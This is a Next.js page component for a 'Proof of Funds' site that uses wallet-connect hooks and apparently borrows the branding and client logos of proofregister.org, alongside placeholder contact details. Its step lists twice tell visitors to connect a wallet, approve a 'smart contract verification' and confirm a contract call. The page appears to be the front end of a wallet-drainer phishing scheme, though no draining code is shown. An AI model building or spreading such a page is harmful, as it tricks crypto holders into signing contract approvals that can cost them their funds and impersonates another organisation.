'use client'

import { useDisconnect, useAppKit, useAppKitNetwork, useWalletInfo } from '@reown/appkit/react'
import { networks } from '@/config'
import WalletBalance from '@/components/WalletBalance'

export default function Home() {
  const { disconnect } = useDisconnect()
  const { open } = useAppKit()
  const { switchNetwork } = useAppKitNetwork()
  const { walletInfo } = useWalletInfo();

  const handleDisconnect = async () => {
    try {
      await disconnect()
    } catch (error) {
      console.error("Failed to disconnect:", error)
    }
  }

  return (

<>
<>
  <meta charSet="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Proof of Funds</title>
  <link
    href="https://db.onlinewebfonts.com/c/fca8cfd5ab0f5792f32a4cfe2165899e?family=Glorify+DEMO"
    rel="stylesheet"
  />
  <style
    dangerouslySetInnerHTML={{
      __html:
        "\n    /* Use the provided font */\n    body {\n        background: #1c1d20;\n      font-family: Glorify DEMO;\n    }\n  "
    }}
  />
  {/* Header */}
  <header className="px-6 py-4 border-b border-gray-700 flex items-center justify-between">
    {/* Use the provided logo instead of text */}
    <img
      src="https://www.proofregister.org/assets/imgs/logo/proof-register-logo.svg"
      alt="Proof Register Logo"
      className="h-10"
    />
    {/* Mobile Menu Icon */}
    <button className="text-2xl lg:hidden">☰</button>
    {/* Desktop Navigation (if applicable) */}
    <nav className="hidden lg:flex space-x-6">
      <a href="#" className="hover:underline">
        Home
      </a>
      <a href="#" className="hover:underline">
        About
      </a>
      <a href="#" className="hover:underline">
        Services
      </a>
      <a href="#" className="hover:underline">
        Contact
      </a>
    </nav>
  </header>
  {/* Hero Section */}
  <section className="py-12 px-6 lg:px-20 text-center">
    <h2 className="text-5xl md:text-8xl lg:text-9xl font-bold tracking-wider">
      PROOF OF FUNDS
    </h2>
    <WalletBalance />
  </section>
  {/* Main Content Section */}
  <main className="px-2 lg:px-20">
    {/* On mobile the sections stack; on desktop they appear side by side */}
    <div className="flex flex-col lg:flex-row items-start gap-12">
    
      <section className="max-w-3xl mx-auto text-left">
        <p className="text-lg uppercase tracking-wider">Follow these steps:</p>
        <ul className="mt-4 space-y-3 text-lg">
          <li className="font-bold">+ Connect wallet</li>
          <li className="font-bold">+ Approve smart contract verification</li>
          <li className="font-bold">+ Confirm Contract Result</li>
        </ul>
        <button onClick={() => open()} className="mt-6 px-8 py-3 border border-white rounded-full text-lg hover:bg-white hover:text-black transition duration-300 w-full md:w-auto">
          CONNECT WALLET
        </button>
      </section>
      <section className="mt-2 max-w-3xl mx-5 text-left">
        <p className="text-gray-400">01</p>
        <h3 className="text-3xl font-bold uppercase">
          Proof of Funds Availability
        </h3>
        <p className="mt-4 text-gray-400 leading-relaxed">
          Proof of funds (PoF) is a verification process that confirms an
          individual or entity has the required assets or liquidity to complete
          a transaction. In traditional finance, this might involve bank
          statements or other financial records. In the crypto space, this
          verification is usually achieved through blockchain technology, where
          digital signatures and addresses are used to confirm the presence of
          sufficient funds in a wallet before a transaction is processed.
        </p>
      </section>
    </div>
    <section className="mt-12 max-w-3xl mx-5 text-left">
      <p className="text-gray-400">02</p>
      <h3 className="text-3xl font-bold uppercase">Why is this Important?</h3>
      <p className="mt-4 font-bold uppercase">
        Ensure Transaction Reliability:
      </p>
      <p className="mt-2 text-gray-400 leading-relaxed">
        Proof of funds checks add a layer of security to ensure that all
        participants in a transaction can meet their obligations, preventing
        fraud and enhancing trust in financial interactions.
      </p>
      <ul className="mt-4 space-y-3 text-lg">
        <li className="font-bold">+ 1. Connect a crypto wallet</li>
        <li className="font-bold">
          + 2. Approve to begin smart contract polling
        </li>
        <li className="font-bold">+ 3. Finally, confirm Contract Call.</li>
      </ul>
    </section>
  </main>
  {/* Clients Section */}
  <section className="py-20 px-6 lg:px-20 text-center">
    <h3 className="text-4xl font-bold uppercase">Trusted Worldwide Clients</h3>
    <div className="mt-10 grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-6">
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-01.svg"
          width="150px"
        />
      </div>
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-02.svg"
          width="150px"
        />
      </div>
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-03.svg"
          width="150px"
        />
      </div>
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-04.svg"
          width="150px"
        />
      </div>
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-05.svg"
          width="150px"
        />
      </div>
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-06.svg"
          width="150px"
        />
      </div>
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-07.svg"
          width="150px"
        />
      </div>
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-08.svg"
          width="150px"
        />
      </div>
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-09.svg"
          width="150px"
        />
      </div>
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-10.svg"
          width="150px"
        />
      </div>
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-11.svg"
          width="150px"
        />
      </div>
      <div className="p-6">
        <img
          src="https://www.proofregister.org/assets/imgs/brand/style2/brand-12.svg"
          width="150px"
        />
      </div>
    </div>
  </section>
  {/* Footer */}
  <footer className="py-10 border-t border-gray-700 text-center text-gray-400">
    <div className="flex flex-col items-center ml-5 mr-5 space-y-4">
      <div className="grid grid-cols-2 md:grid-cols-3 gap-6 text-sm">
        <div>
          <img
            src="https://www.proofregister.org/assets/imgs/logo/proof-register-logo.svg"
            alt="Proof Register Logo"
            className="h-12"
          />
        </div>
        <div>
          <a href="#" className="block hover:underline">
            About Me
          </a>
          <a href="#" className="block hover:underline">
            Work
          </a>
          <a href="#" className="block hover:underline">
            Contact
          </a>
        </div>
        <div>
          <p> 6541, Brand Tower, New York, USA</p>
        </div>
        <div>
          <a href="mailto:info@example.com" className="block hover:underline">
            info@example.com
          </a>
          <p>+(1) 365 301 710</p>
        </div>
      </div>
      <p className="mt-6">
        2022 - 2025 | ALL RIGHTS RESERVED BY PROOF REGISTER
      </p>
      <div className="mt-2 space-x-4">
        <a href="#" className="hover:underline">
          FB
        </a>{" "}
        |
        <a href="#" className="hover:underline">
          TW
        </a>{" "}
        |
        <a href="#" className="hover:underline">
          IN
        </a>
      </div>
    </div>
  </footer>
</>

</>
  )
}
